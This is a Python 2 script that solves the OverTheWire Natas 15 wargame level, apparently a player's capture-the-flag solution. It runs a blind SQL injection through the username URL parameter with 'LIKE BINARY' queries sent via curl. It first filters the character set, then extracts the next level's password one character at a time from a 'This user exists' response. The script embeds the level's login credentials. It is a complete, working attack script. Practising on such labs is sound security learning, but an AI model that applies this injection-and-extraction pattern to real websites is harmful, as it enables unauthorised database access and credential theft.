import subprocess as sp
import re

alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

test_pre_request = "http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20and%20password%20like%20binary%20%22%"
test_post_request = "%&debug"
pre_request = "http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20and%20password%20like%20binary%20%22"
post_request = "%&debug"
auth = "natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

#Determine which characters are in alphabet
for char in alphabet:
    url = test_pre_request + char + test_post_request
    process = sp.Popen(["curl","-s", url, "--user", auth], stdout = sp.PIPE)
    out,err = process.communicate()
    if not "This user exists" in out:
        alphabet = alphabet.replace(char,"")
        print "removed " + char
    else:
        print "kept " + char


password = ""
for cur_index in xrange(0,32):
    prev_len = len(password)
    for char in alphabet:
        url = pre_request + password + char + post_request
        process = sp.Popen(["curl","-s", url, "--user", auth], stdout = sp.PIPE)
        out,err = process.communicate()
        if "This user exists" in out:
            password += char
            break
    if prev_len == len(password):
        print "Bad Alphabet, no character found"
        print (password + "\r")
    else:
        print (password + "\r")



